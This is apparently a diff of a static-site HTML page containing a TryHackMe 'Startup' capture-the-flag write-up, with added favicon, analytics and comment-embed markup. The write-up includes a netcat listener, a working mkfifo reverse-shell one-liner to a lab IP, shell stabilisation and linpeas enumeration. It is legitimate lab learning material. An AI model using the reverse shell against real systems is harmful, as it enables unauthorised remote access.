@@ -16,7 +16,13 @@
           <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
           <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
       <![endif]-->
-       <meta property="og:title" content="StartupSpiceHut_writeup" />
+    <link rel="icon" href="https://tzero86bits.tk/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://tzero86bits.tk/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://tzero86bits.tk/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://tzero86bits.tk/apple-touch-icon.png">
+<link rel="mask-icon" href="https://tzero86bits.tk/safari-pinned-tab.svg">
+<meta name="theme-color" content="#1d1e20">
+<meta name="msapplication-TileColor" content="#1d1e20"><meta property="og:title" content="StartupSpiceHut_writeup" />
 <meta property="og:description" content="" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://tzero86bits.tk/posts/startupspicehut_writeup/" /><meta property="article:published_time" content="2020-11-12T18:46:31-05:00" />
@@ -26,6 +32,18 @@
 <meta name="twitter:title" content="StartupSpiceHut_writeup"/>
 <meta name="twitter:description" content="We are Spice Hut, a new startup company that just made it big! We ask that you perform a thorough penetration test and try to own root. Good luck!"/>
 
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-175520987-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
 </head>
 <body class="terminal">
     <div class="container">
@@ -43,8 +61,6 @@
                 
                 <li><a href="https://tzero86bits.tk/posts/" typeof="ListItem">posts/</a></li>
                 
-                <li><a href="https://tzero86bits.tk/photos/" typeof="ListItem">photos/</a></li>
-                
             </ul>
           </nav>
         </div>
@@ -57,7 +73,7 @@ Nov. 12, 2020
 
 
 <br/><br/>
-<img src="../img/spicehut_cover.gif" alt="Post Cover Gif animation";>
+<img src="../img/spicehut_cover.gif" alt="Post Cover Gif animation"; style="width:100%;height:auto;left:0;right:0;margin:0 auto;text-align:center; border-radius:1%">
 <br/><br/>
 <h1 id="startup-spice-hut---thm-room">Startup (Spice Hut) - THM Room</h1>
 <p>Welcome to another writeup, this time we&rsquo;ll be trying to hack a newly released room on TryHackMe called Startup created by <code>r1gormort1s</code>!</p>
@@ -104,7 +120,7 @@ Nov. 12, 2020
 <p>So we need to figure out how to escape this restricted access we have.</p>
 <h3 id="stabilizing-our-shell-a-bit">Stabilizing our shell a bit</h3>
 <p>Before we do that let&rsquo;s fire up a reverse shell to our machine and try to stabilize the shell so we can work more comfortable.</p>
-<p>To do that I first run a <code>nc -nlvp 2112</code> (our favorite album and port number :laughing:) then we run the following command in our phpbash: <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.13.0.34 2112 &gt;/tmp/f</code></p>
+<p>To do that I first run a <code>nc -nlvp 2112</code> (our favorite album and port number 😆) then we run the following command in our phpbash: <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.13.0.34 2112 &gt;/tmp/f</code></p>
 <p>With that we have a reverse shell, let&rsquo;s try to stabilize it now by running this python line:
 <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code> and then <code>export TERM=xterm</code></p>
 <p>That&rsquo;s it, now we have a somewhat better shell to explore around.</p>
@@ -116,7 +132,7 @@ Now let&rsquo;s try to upload that file to the target machine:</p>
 <p>NOTE: Remember we only have write permissions inside <code>/var/www/html/files/ftp/</code> if you try to upload anywhere else you&rsquo;ll get a nice <code>permission denied</code>.</p>
 </blockquote>
 <p>Ok that works, now let&rsquo;s make sure we make that file executable by running <code>chmod +x linpeas.sh</code> and then we execute it <code>./linpeash.sh</code>:</p>
-<p>Well that' took a while to run and&hellip; it didn&rsquo;t found anything immediately exploitable for us (unless you are not a noob like me and noticed something good there :joy: ). However, it seems to have found an username of <code>vagrant</code> and some unexpected folders named <code>incidents</code>, <code>data</code> and <code>vagrant</code>. Another possible interesting piece of info is that we have <code>/usr/bin/gettext.sh</code> inside the <code>PATH</code> variable.</p>
+<p>Well that' took a while to run and&hellip; it didn&rsquo;t found anything immediately exploitable for us (unless you are not a noob like me and noticed something good there 😂 ). However, it seems to have found an username of <code>vagrant</code> and some unexpected folders named <code>incidents</code>, <code>data</code> and <code>vagrant</code>. Another possible interesting piece of info is that we have <code>/usr/bin/gettext.sh</code> inside the <code>PATH</code> variable.</p>
 <h3 id="incidents">Incidents</h3>
 <p>If we list the files inside the <code>/incidents</code> we see there is an interesting file there:</p>
 <p><img src="https://i.imgur.com/BYuiCuo.png" alt=""></p>
@@ -153,7 +169,7 @@ Now let&rsquo;s try to upload that file to the target machine:</p>
 <p>But if we thing about it, it&rsquo;s quite possible that planner.sh is getting executed by a cronjob every X minutes. Let&rsquo;s see if we get a connection if we wait let&rsquo;s say, five minutes. If we don&rsquo;t, we&rsquo;ll have to find a way to see if there any jobs running that end up running <code>planner.sh</code>.</p>
 <p>We were right, after just a minute or two we got back a connection as root!</p>
 <p><img src="https://i.imgur.com/C99cCHo.png" alt=""></p>
-<p>Now let&rsquo;s get that root flag and go make some dinner, I&rsquo;m starving :laughing:</p>
+<p>Now let&rsquo;s get that root flag and go make some dinner, I&rsquo;m starving 😆</p>
 <p><img src="https://i.imgur.com/e9F4bVm.png" alt=""></p>
 <p>That&rsquo;s it for this room, I hope you enjoy it as much as I did. Props to <code>r1gormort1s</code> for creating it!</p>
 <p>Happy hacking!</p>
@@ -171,11 +187,31 @@ Now let&rsquo;s try to upload that file to the target machine:</p>
     </div>
 </div>
 
-
+<div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "tzero86bits" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
 
         <div class="footer">
-    Made with <a href="https://gohugo.io/">Hugo</a> with
+    Made with <a href="https://gohugo.io/">Hugo</a> based of
     <a href="https://github.com/mrmierzejewski/hugo-theme-console/">Console Theme</a>. 
+    Noli umquam discere desinere.
 </div>
 
     </div>
